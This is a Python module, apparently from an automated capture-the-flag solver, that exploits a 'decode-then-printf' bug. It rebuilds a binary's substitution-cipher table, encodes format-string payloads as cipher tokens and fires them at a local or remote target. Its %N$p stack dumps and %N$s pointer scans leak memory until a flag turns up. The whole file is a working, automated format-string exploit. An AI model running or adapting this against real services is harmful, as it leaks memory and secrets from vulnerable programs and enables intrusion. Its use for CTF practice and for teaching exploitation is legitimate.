"""cipher-fmt: a substitution cipher whose decoded output feeds a printf format.

Some challenges (e.g. the emoji cipher) look like a decoder but are really a
format-string pwn: the program does `printf(decode(your_input))`, so the decoded
bytes are the format string. The twist is the input filter -- you can only send
tokens the table knows -- but the table covers printable ASCII, which is exactly
what a `%p`/`%s` payload needs.

This strategy ties the two halves together automatically: it reconstructs the
table, encodes a format-string leak as tokens, fires it at the (local or remote)
target, and reads the flag out of the leak -- so a single run solves it:

    python3 autoscram.py ./emoji_cipher --remote host:port --yes
"""
import re

from .base import Strategy
from .. import report
from ..comms import connect
from .subcipher import build_encoder, locate_table

_BATCH = 12          # format specifiers per request (keep decoded len < buffer)
_MAXOFF = 60         # how many stack slots to probe


class CipherFormatString(Strategy):
    name = "cipher-fmt"
    desc = "decode-then-printf: leak the flag with a token-encoded format string"
    verifiable = False               # flag lives on the target, not in a sentinel

    def detect(self, ctx):
        if not ctx.analysis.fmt_leaks:
            return 0, "no printf-as-format-string sink"
        addr, how = locate_table(ctx.binary)
        if addr is None:
            return 0, "no substitution table"
        return 85, f"decoded cipher output flows into printf ({how})"

    def run(self, ctx, io):
        try:
            io.close()               # we drive our own (re)connections
        except Exception:
            pass

        emojify, mapping = build_encoder(ctx.binary)
        if emojify is None or not mapping:
            report.warn("cipher-fmt: could not reconstruct the table")
            return None
        report.ok(f"table rebuilt ({len(mapping)} tokens); the decoded text is "
                  "used as a printf format string")

        target = getattr(ctx, "remote_target", None)
        flag_re = ctx.flag_re
        pat = re.compile(flag_re.encode() if isinstance(flag_re, str) else flag_re)

        # Wrap the real output in markers so we can find it no matter what else
        # the service sends: a banner, or our own input echoed back by a PTY.
        # A trailing positional %c with a huge width forces a flush when the
        # remote's stdout is fully buffered (this binary has no setvbuf). Keeping
        # every conversion positional satisfies glibc's all-or-nothing $ rule.
        ML, MR, PAD = "SCR[", "]RCS", "%1$9000c"
        marker = re.compile(re.escape(ML.encode()) + b"(.*?)" + re.escape(MR.encode()),
                            re.S)
        self._saw_bytes = False

        def ask(body):
            """Send one positional format string, return the bytes it emitted
            between the markers (or None). Fresh connection each time so a bad
            %s deref can't kill the rest of the scan."""
            try:
                conn = connect(ctx.binary.path, target)
            except Exception as e:
                report.warn(f"connect failed: {e}")
                return None
            try:
                conn.sendline(emojify(ML + body + MR + PAD))
                blob = conn.recvrepeat(1.2)      # grab everything, not one line
            except Exception:
                blob = b""
            finally:
                try:
                    conn.close()
                except Exception:
                    pass
            if blob:
                self._saw_bytes = True
            m = marker.search(blob)
            return m.group(1) if m else None

        # ---- 1) %p stack dump (safe: never dereferences) ----
        report.step("Leaking the stack via %p (token-encoded)...")
        slots = {}
        for start in range(1, _MAXOFF + 1, _BATCH):
            body = ",".join(f"%{i}$p" for i in range(start, start + _BATCH))
            got = ask(body)
            if got:
                for j, tok in enumerate(got.split(b",")):
                    tok = tok.strip()
                    if tok.startswith(b"0x"):
                        try:
                            slots[start + j] = int(tok, 16).to_bytes(8, "little")
                        except ValueError:
                            pass
                blob = b"".join(slots[k] for k in sorted(slots))
                m = pat.search(blob)
                if m:
                    flag = m.group(0).decode(errors="replace")
                    report.ok(f"FLAG (stack leak): {flag}")
                    return flag

        # ---- 2) %N$s scan (dereference each slot as a string) ----
        report.step("No flag on the raw stack; scanning %N$s pointers...")
        for i in range(1, _MAXOFF + 1):
            got = ask(f"%{i}$s")
            if got:
                m = pat.search(got)
                if m:
                    flag = m.group(0).decode(errors="replace")
                    report.ok(f"FLAG (%{i}$s): {flag}")
                    return flag

        if not self._saw_bytes:
            report.warn("The remote returned nothing for any payload -- its stdout "
                        "is likely fully buffered with no flush path. Connect by "
                        "hand (nc) to confirm what it emits.")
        else:
            report.warn("No flag via format-string leak. Printable stack strings:")
            for off in sorted(slots):
                b = slots[off].rstrip(b"\x00")
                if b and all(0x20 <= c < 0x7f for c in b):
                    report.info(f"  %{off}$p -> {b.decode()!r}")
        return None
